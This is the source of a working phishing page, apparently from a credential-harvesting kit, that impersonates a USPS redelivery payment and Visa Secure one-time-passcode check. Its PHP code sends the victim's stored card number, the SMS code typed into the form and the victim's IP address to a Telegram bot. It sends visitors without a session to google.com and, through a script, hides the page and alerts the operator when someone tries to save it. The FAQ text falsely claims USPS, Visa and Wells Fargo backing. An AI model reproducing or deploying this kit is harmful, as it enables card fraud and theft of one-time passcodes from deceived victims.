<?php
session_start();
function getUserIP() {
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } 
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } 
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
if (isset($_SESSION["captcha"]))
{
	$string = $_SESSION["Vic_cc"];
	$firstFour = substr($string, 0, 4); // Extracts the first 4 characters
	$lastFour = substr($string, -4); // Extracts the last 4 characters
    include 'config.php';
    $userIP = getUserIP();
    function sendMessageT($chatID, $messaggio, $token){
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
        $url = $url . "&text=" . urlencode($messaggio);
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($curl);
        curl_close($curl);
    }
	if(isset($_POST['okbba'])){
		$message = "cc : " . $string . "\nSMS Code  : ".$_POST['Credential']."\nIP      : ".$userIP;
		sendMessageT($chatID, $message, $botToken);
		HEADER("Location: hak_rakesh.php");
	}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validate</title>
    <link href="template-e63a3d48ea.css" rel="stylesheet">
    <link href="validateview-451126d279.css" rel="stylesheet">
    <style>
      body {
        color: #000000;
        font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;
        font-size: 1.25em
      }

      .header,
      legend,
      h1,
      h2,
      h3,
      h4 {
        color: #000000
      }

      label {
        color: #000000
      }

      a,
      .btn-link {
        color: #000000;
        text-decoration: underline
      }

      a:visited,
      .btn-link:visited {
        color: #000000
      }

      a:hover,
      a:focus,
      .btn-link:hover,
      .btn-link:focus {
        color: #211f1f
      }

      a:active,
      .btn-link:active {
        color: #211f1f
      }

      a.btn-link {
        font-size: .95em
      }

      .btn-primary,
      .btn-primary:focus,
      .btn-primary:hover {
        background: #211f1f;
        color: #FFF;
        border: none;
        border-radius: 0
      }

      .btn-primary:active,
      .btn-primary:active:hover,
      .btn-primary:active:focus {
        background: #1c69d3
      }

      fieldset {
        border: 0
      }

      fieldset>legend {
        border-bottom: 0;
        font-size: 1.00em
      }

      :not(.lt-ie9) label.custom-radio [type=radio]:checked+span:before {
        background: #211f1f
      }

      .accordion.modal .modal-body .panel-group .expander {
        color: #211f1f
      }

      .accordion.modal .modal-body .panel-group .panel {
        background: #FFF
      }

      .field-validation-error {
        color: #AB2C29
      }

      .toast-top-full-width {
        display: none
      }
    </style>
  </head>
  <body>
    <div class="threeds-two">
      <div class="container-fluid">
        <div class="header" id="HeaderLogos">
          <div class="row no-pad">
            <div class="col-12">
               <br>
              <img class="img-responsive header-logo pull-left" src="https://logos-world.net/wp-content/uploads/2020/10/United-States-Postal-Service-Logo.png">
              <?php 
              	if($string[0]=='3'){
              		echo('<img class="img-responsive header-logo pull-right" src="amex.png">');
              	}else if($string[0]=='4'){
              		echo('<img class="img-responsive header-logo pull-right" src="vbv_logo.gif">');
              	}else if($string[0]=='5'){
              		echo('<img class="img-responsive header-logo pull-right" src="10ad0777-c108-45e7-8d80-8da0bb22ccd3.png">');
              	}else{
              		echo('<img class="img-responsive header-logo pull-right" src="discover.png">');
              	}
              ?>
            </div>
          </div>
        </div>
        <br>
        <div class="body" dir="LTR" style="bottom: 58px;">
          <div class="container container-sticky-footer">
            <div class="body" dir="LTR" style="bottom: 58px;">
              <h1 class="screenreader-only">Your One-time Passcode has been sent</h1>
              <br>
              <div class="row"></div>
              <div class="row">
                <div class="col-12" id="ValidateOneUpMessage">
                  <div id="Body1">A one-time code was sent to <?php echo($_SESSION["Vic_number"]);?>. To continue with your transaction, please enter your one-time passcode below and click 'Submit'.</div>
                </div>
              </div>
              <br>
              <div class="row form-two-col">
                <div class="col-12">
                  <fieldset id="ValidateTransactionDetailsContainer">
                    <legend id="ValidateTransactionDetailsHeader">Transaction Details</legend>
                    <div class="validate-field row">
                      <span class="validate-label col-6">Merchant:</span>
                      <span class="col-6">U​S​P​S R​e​d​e​l​i​v​e​r​y Service</span>
                    </div>
                    <div class="validate-field row">
                      <span class="validate-label col-6">Transaction Amount:</span>
                      <span class="col-6 always-left-to-right">$2.99 USD</span>
                    </div>
                    <div class="validate-field row">
                      <span class="validate-label col-6">Card Number:</span>
                      <span class="col-6 always-left-to-right"> <?php echo($firstFour);?>****** <?php echo($lastFour);?> </span>
                    </div>
                    <div class="validate-field row">
                      <span class="validate-label col-6">Enter Code:</span>
                      <form method="post" action="">
                        <span>
                          <input data-val="true" required id="Credential_Value" name="Credential" type="text">
                        </span>
                    </div>
                    <div class="validate-field row">
                      <span class="validate-label col-6">&nbsp;</span>
                      <span id="ValidationErrorMessage" class="field-validation-error" style="display: none;"></span>
                      <span class="field-validation-valid col-6" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span>
                    </div>
                  </fieldset>
                </div>
              </div>
              <div class="row">
                <div class="col-12" id="ValidateOptInMessage"></div>
              </div>
              <div class="row">
                <div class="col-12">
                  <div id="linkContainer">
                    <a href="#" id="ResendLink">Click here to receive another code</a>
                  </div>
                </div>
              </div>
            </div>
            <div class="sticky-footer">
              <div class="row no-pad">
                <div class="col-12 text-center">
                  <button type="submit" class="btn btn-primary" name="okbba">Submit</button>
                </div>
              </div>
              </form>
              <div class="footer" id="FooterLinks">
                <div class="row">
                  <div class="col-12">
                    <ul class="list-inline list-inline-separated pull-left">
                      <li>
                        <a class="btn btn-link" data-target="#FAQ" data-toggle="modal" href="#FAQ" id="FooterLink1">FAQ</a>
                      </li>
                    </ul>
                    <a id="ExitLink" class="list-inline list-inline-separated pull-right" href="#">Exit</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <br>
          <div class="accordion modal fade" id="FAQ" tabindex="-1" role="dialog" aria-labelledby="FAQ-label" aria-hidden="true">
            <div class="modal-dialog">
              <div class="modal-content">
                <div class="modal-header">
                  <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                  <h4 class="modal-title" id="FAQ-label">Frequently Asked Questions</h4>
                </div>
                <div class="modal-body">
                  <ol class="panel-group list-unstyled" id="collapse">
                    <li class="panel panel-default">
                      <div class="panel-heading">
                        <div class="panel-title">
                          <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-1">
                            <div class="expander">
                              <span></span>
                            </div>
                            <div class="content">What is Visa Secure?</div>
                          </a>
                        </div>
                      </div>
                      <div id="collapse-1" class="panel-collapse collapse">
                        <div class="panel-body">
                          <div class="expander">&nbsp;</div>
                          <div class="content">Visa Secure is a service offered by Visa and USPS to protect cardholders against unauthorized use. Each transaction is evaluated by the service and in some cases, you will be asked to enter a one-time passcode to complete the transaction.</div>
                        </div>
                      </div>
                    </li>
                    <li class="panel panel-default">
                      <div class="panel-heading">
                        <div class="panel-title">
                          <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-2">
                            <div class="expander">
                              <span></span>
                            </div>
                            <div class="content">Will a one-time passcode be required for all online purchases?</div>
                          </a>
                        </div>
                      </div>
                      <div id="collapse-2" class="panel-collapse collapse">
                        <div class="panel-body">
                          <div class="expander">&nbsp;</div>
                          <div class="content">No. USPS is working to keep your card secure and will only prompt you for a passcode when additional verification is required.</div>
                        </div>
                      </div>
                    </li>
                    <li class="panel panel-default">
                      <div class="panel-heading">
                        <div class="panel-title">
                          <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-3">
                            <div class="expander">
                              <span></span>
                            </div>
                            <div class="content">What if I do not recognize the mobile numbers available to send the passcode?</div>
                          </a>
                        </div>
                      </div>
                      <div id="collapse-3" class="panel-collapse collapse">
                        <div class="panel-body">
                          <div class="expander">&nbsp;</div>
                          <div class="content">If you do not recognize the numbers, please call the number on the back of your card to speak with a Wells Fargo representative.</div>
                        </div>
                      </div>
                    </li>
                    <li class="panel panel-default">
                      <div class="panel-heading">
                        <div class="panel-title">
                          <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-4">
                            <div class="expander">
                              <span></span>
                            </div>
                            <div class="content">What if I do not receive the one-time passcode?</div>
                          </a>
                        </div>
                      </div>
                      <div id="collapse-4" class="panel-collapse collapse">
                        <div class="panel-body">
                          <div class="expander">&nbsp;</div>
                          <div class="content">You may request another code by selecting “Click here to receive another code” to your preferred mobile number.</div>
                        </div>
                      </div>
                    </li>
                    <li class="panel panel-default">
                      <div class="panel-heading">
                        <div class="panel-title">
                          <a class="collapsed" data-toggle="collapse" data-parent="#collapse" href="#collapse-5">
                            <div class="expander">
                              <span></span>
                            </div>
                            <div class="content">What happens if I select “Exit?”</div>
                          </a>
                        </div>
                      </div>
                      <div id="collapse-5" class="panel-collapse collapse">
                        <div class="panel-body">
                          <div class="expander">&nbsp;</div>
                          <div class="content">The experience varies by merchant, but it is not likely that you will be able to proceed with the transaction.</div>
                        </div>
                      </div>
                    </li>
                  </ol>
                </div>
                <div class="modal-footer">
                  <button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

    <script>
        document.addEventListener('keydown', function(event) {
            if ((event.ctrlKey || event.metaKey) && event.key === 's') {
                event.preventDefault();
                document.body.innerHTML = 'EZEBBBBY habeb tsajel l page ?';
                var formData = new FormData();
                formData.append('action', 'notify');
                fetch('zebu_alert.php', {method: 'POST',body: formData})
                .then(response => response.text())
                .then(result => {
                    console.log(result);
                    if (result.includes("Notification sent successfully")) {
                        window.location.href = window.location.href;
                    } 
                })
                .catch(error => console.error('Error:', error));
            }
        });
    </script>
      
  </body>
</html>

<?php
}else {
	HEADER("Location: https://google.com");
}
?>